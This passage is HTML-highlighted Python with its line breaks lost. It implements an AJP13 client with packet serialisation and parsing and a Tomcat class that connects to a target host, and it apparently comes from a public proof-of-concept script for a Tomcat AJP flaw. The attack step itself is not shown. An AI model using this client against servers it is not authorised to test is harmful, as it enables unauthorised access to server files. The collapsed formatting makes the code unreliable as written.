VERSION_CONTROL<span class="token punctuation">,</span> CHECKIN<span class="token punctuation">,</span> CHECKOUT<span class="token punctuation">,</span> UNCHECKOUT<span class="token punctuation">,</span> SEARCH<span class="token punctuation">,</span> MKWORKSPACE<span class="token punctuation">,</span> UPDATE<span class="token punctuation">,</span> LABEL<span class="token punctuation">,</span> MERGE<span class="token punctuation">,</span> BASELINE_CONTROL<span class="token punctuation">,</span> MKACTIVITY <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span>REQUEST_METHODS <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'GET'</span><span class="token punctuation">:</span> GET<span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">:</span> POST<span class="token punctuation">,</span> <span class="token string">'HEAD'</span><span class="token punctuation">:</span> HEAD<span class="token punctuation">,</span> <span class="token string">'OPTIONS'</span><span class="token punctuation">:</span> OPTIONS<span class="token punctuation">,</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span> PUT<span class="token punctuation">,</span> <span class="token string">'DELETE'</span><span class="token punctuation">:</span> DELETE<span class="token punctuation">,</span> <span class="token string">'TRACE'</span><span class="token punctuation">:</span> TRACE<span class="token punctuation">}</span><span class="token comment"># server == web server, container == servlet</span>SERVER_TO_CONTAINER<span class="token punctuation">,</span> CONTAINER_TO_SERVER <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>COMMON_HEADERS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"SC_REQ_ACCEPT"</span><span class="token punctuation">,</span><span class="token string">"SC_REQ_ACCEPT_CHARSET"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_ACCEPT_ENCODING"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_ACCEPT_LANGUAGE"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_AUTHORIZATION"</span><span class="token punctuation">,</span><span class="token string">"SC_REQ_CONNECTION"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_CONTENT_TYPE"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_CONTENT_LENGTH"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_COOKIE"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_COOKIE2"</span><span class="token punctuation">,</span><span class="token string">"SC_REQ_HOST"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_PRAGMA"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_REFERER"</span><span class="token punctuation">,</span> <span class="token string">"SC_REQ_USER_AGENT"</span><span class="token punctuation">]</span>ATTRIBUTES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"context"</span><span class="token punctuation">,</span> <span class="token string">"servlet_path"</span><span class="token punctuation">,</span> <span class="token string">"remote_user"</span><span class="token punctuation">,</span> <span class="token string">"auth_type"</span><span class="token punctuation">,</span> <span class="token string">"query_string"</span><span class="token punctuation">,</span> <span class="token string">"route"</span><span class="token punctuation">,</span> <span class="token string">"ssl_cert"</span><span class="token punctuation">,</span> <span class="token string">"ssl_cipher"</span><span class="token punctuation">,</span> <span class="token string">"ssl_session"</span><span class="token punctuation">,</span> <span class="token string">"req_attribute"</span><span class="token punctuation">,</span> <span class="token string">"ssl_key_size"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">,</span> <span class="token string">"stored_method"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_direction<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>prefix_code <span class="token operator">=</span> <span class="token number">0x02</span>self<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>protocol <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>server_name <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>server_port <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>num_headers <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>attributes <span class="token operator">=</span> <span class="token boolean">None</span>self<span class="token punctuation">.</span>data_direction <span class="token operator">=</span> data_direction<span class="token keyword">def</span> <span class="token function">pack_headers</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>num_headers <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token string">""</span>res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;h"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token keyword">for</span> h_name <span class="token keyword">in</span> self<span class="token punctuation">.</span>request_headers<span class="token punctuation">:</span><span class="token keyword">if</span> h_name<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"SC_REQ"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>code <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>COMMON_HEADERS<span class="token punctuation">.</span>index<span class="token punctuation">(</span>h_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"BB"</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>h_name<span class="token punctuation">)</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">pack_attributes</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>res <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">for</span> attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>attributes<span class="token punctuation">:</span>a_name <span class="token operator">=</span> attr<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>code <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>ATTRIBUTES<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token keyword">if</span> a_name <span class="token operator">==</span> <span class="token string">"req_attribute"</span><span class="token punctuation">:</span>aa_name<span class="token punctuation">,</span> a_value <span class="token operator">=</span> attr<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>aa_name<span class="token punctuation">)</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>a_value<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>attr<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>res <span class="token operator">=</span> <span class="token string">""</span>res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"bb"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>prefix_code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>method<span class="token punctuation">)</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>protocol<span class="token punctuation">)</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>req_uri<span class="token punctuation">)</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>remote_host<span class="token punctuation">)</span>res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server_name<span class="token punctuation">)</span>res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;h"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>server_port<span class="token punctuation">)</span>res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>is_ssl<span class="token punctuation">)</span>res <span class="token operator">+=</span> self<span class="token punctuation">.</span>pack_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">+=</span> self<span class="token punctuation">.</span>pack_attributes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> self<span class="token punctuation">.</span>data_direction <span class="token operator">==</span> AjpForwardRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">:</span>header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;bbh"</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&gt;bbh"</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> header <span class="token operator">+</span> res<span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raw_packet<span class="token punctuation">)</span><span class="token punctuation">:</span>stream <span class="token operator">=</span> StringIO<span class="token punctuation">(</span>raw_packet<span class="token punctuation">)</span>self<span class="token punctuation">.</span>magic1<span class="token punctuation">,</span> self<span class="token punctuation">.</span>magic2<span class="token punctuation">,</span> data_len <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"bbH"</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>prefix_code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>method <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"bb"</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>protocol <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>self<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>self<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>self<span class="token punctuation">.</span>server_name <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>self<span class="token punctuation">.</span>server_port <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;h"</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;H"</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token punctuation">:</span>code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;H"</span><span class="token punctuation">)</span><span class="token keyword">if</span> code <span class="token operator">&gt;</span> <span class="token number">0xA000</span><span class="token punctuation">:</span>h_name <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>COMMON_HEADERS<span class="token punctuation">[</span>code <span class="token operator">-</span> <span class="token number">0xA001</span><span class="token punctuation">]</span><span class="token keyword">else</span><span class="token punctuation">:</span>h_name <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"%ds"</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \0</span>h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span> <span class="token operator">=</span> h_value<span class="token keyword">def</span> <span class="token function">send_and_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> stream<span class="token punctuation">,</span> save_cookies<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>i <span class="token operator">=</span> socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>self<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> self<span class="token punctuation">.</span>method <span class="token operator">==</span> AjpForwardRequest<span class="token punctuation">.</span>POST<span class="token punctuation">:</span><span class="token keyword">return</span> resr <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">assert</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERSres<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">if</span> save_cookies <span class="token keyword">and</span> <span class="token string">'Set-Cookie'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>response_headers<span class="token punctuation">:</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'SC_REQ_COOKIE'</span><span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">.</span>response_headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span><span class="token comment"># read body chunks and end response packets</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">if</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>END_RESPONSE<span class="token punctuation">:</span><span class="token keyword">break</span><span class="token keyword">elif</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_BODY_CHUNK<span class="token punctuation">:</span><span class="token keyword">continue</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">raise</span> NotImplementedError<span class="token keyword">break</span><span class="token keyword">return</span> res<span class="token keyword">class</span> <span class="token class-name">AjpResponse</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>_<span class="token punctuation">,</span>_<span class="token punctuation">,</span>_<span class="token punctuation">,</span>SEND_BODY_CHUNK<span class="token punctuation">,</span> SEND_HEADERS<span class="token punctuation">,</span> END_RESPONSE<span class="token punctuation">,</span> GET_BODY_CHUNK <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>COMMON_SEND_HEADERS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"Content-Language"</span><span class="token punctuation">,</span> <span class="token string">"Content-Length"</span><span class="token punctuation">,</span> <span class="token string">"Date"</span><span class="token punctuation">,</span> <span class="token string">"Last-Modified"</span><span class="token punctuation">,</span><span class="token string">"Location"</span><span class="token punctuation">,</span> <span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> <span class="token string">"Set-Cookie2"</span><span class="token punctuation">,</span> <span class="token string">"Servlet-Engine"</span><span class="token punctuation">,</span> <span class="token string">"Status"</span><span class="token punctuation">,</span> <span class="token string">"WWW-Authenticate"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># read headers</span>self<span class="token punctuation">.</span>magic<span class="token punctuation">,</span> self<span class="token punctuation">.</span>data_length<span class="token punctuation">,</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;HHb"</span><span class="token punctuation">)</span><span class="token keyword">if</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS<span class="token punctuation">:</span>self<span class="token punctuation">.</span>parse_send_headers<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_BODY_CHUNK<span class="token punctuation">:</span>self<span class="token punctuation">.</span>parse_send_body_chunk<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>END_RESPONSE<span class="token punctuation">:</span>self<span class="token punctuation">.</span>parse_end_response<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">elif</span> self<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>GET_BODY_CHUNK<span class="token punctuation">:</span>self<span class="token punctuation">.</span>parse_get_body_chunk<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">raise</span> NotImplementedError<span class="token keyword">def</span> <span class="token function">parse_send_headers</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>http_status_code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;H"</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>http_status_msg <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;H"</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>response_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token punctuation">:</span>code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;H"</span><span class="token punctuation">)</span><span class="token keyword">if</span> code <span class="token operator">&lt;=</span> <span class="token number">0xA000</span><span class="token punctuation">:</span> <span class="token comment"># custom header</span>h_name<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"%ds"</span> <span class="token operator">%</span> code<span class="token punctuation">)</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \0</span>h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>h_name <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>COMMON_SEND_HEADERS<span class="token punctuation">[</span>code<span class="token operator">-</span><span class="token number">0xA001</span><span class="token punctuation">]</span>h_value <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>self<span class="token punctuation">.</span>response_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span> <span class="token operator">=</span> h_value<span class="token keyword">def</span> <span class="token function">parse_send_body_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>data_length<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;H"</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>data <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>self<span class="token punctuation">.</span>data_length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">parse_end_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>reuse<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">parse_get_body_chunk</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>rlen<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">"&gt;H"</span><span class="token punctuation">)</span><span class="token keyword">return</span> rlen<span class="token decorator annotation punctuation">@staticmethod</span><span class="token keyword">def</span> <span class="token function">receive</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">:</span>r <span class="token operator">=</span> AjpResponse<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token keyword">return</span> r<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">prepare_ajp_forward_request</span><span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> req_uri<span class="token punctuation">,</span> method<span class="token operator">=</span>AjpForwardRequest<span class="token punctuation">.</span>GET<span class="token punctuation">)</span><span class="token punctuation">:</span>fr <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">(</span>AjpForwardRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">)</span>fr<span class="token punctuation">.</span>method <span class="token operator">=</span> methodfr<span class="token punctuation">.</span>protocol <span class="token operator">=</span> <span class="token string">"HTTP/1.1"</span>fr<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> req_urifr<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> target_hostfr<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> <span class="token boolean">None</span>fr<span class="token punctuation">.</span>server_name <span class="token operator">=</span> target_hostfr<span class="token punctuation">.</span>server_port <span class="token operator">=</span> <span class="token number">80</span>fr<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'SC_REQ_ACCEPT'</span><span class="token punctuation">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span><span class="token string">'SC_REQ_CONNECTION'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span><span class="token string">'SC_REQ_CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'SC_REQ_HOST'</span><span class="token punctuation">:</span> target_host<span class="token punctuation">,</span><span class="token string">'SC_REQ_USER_AGENT'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla'</span><span class="token punctuation">,</span><span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate, sdch'</span><span class="token punctuation">,</span><span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.5'</span><span class="token punctuation">,</span><span class="token string">'Upgrade-Insecure-Requests'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'Cache-Control'</span><span class="token punctuation">:</span> <span class="token string">'max-age=0'</span><span class="token punctuation">}</span>fr<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> <span class="token boolean">False</span>fr<span class="token punctuation">.</span>attributes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">return</span> fr<span class="token keyword">class</span> <span class="token class-name">Tomcat</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_hostself<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_portself<span class="token punctuation">.</span>socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>stream <span class="token operator">=</span> self<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>makefile<span class="token punctuation">(</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token comment">#self.stream = self.socket.makefile("rb", bufsize=0)</span><span class="token keyword">def</span> <span class="token function">perform_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> req_uri<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> method<span class="token operator">=</span><span class="token string">'GET'</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> attributes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> req_uriself<span class="token punctuation">.</span>forward_request <span class="token operator">=</span> prepare_ajp_forward_request<span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>req_uri<span class="token punctuation">,</span> method<span class="token operator">=</span>AjpForwardRequest<span class="token punctuation">.</span>REQUEST_METHODS<span class="token punctuation">.</span>get<span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Getting resource at ajp13://%s:%d%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">,</span> req_uri<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> user <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> password <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>forward_request<span class="token 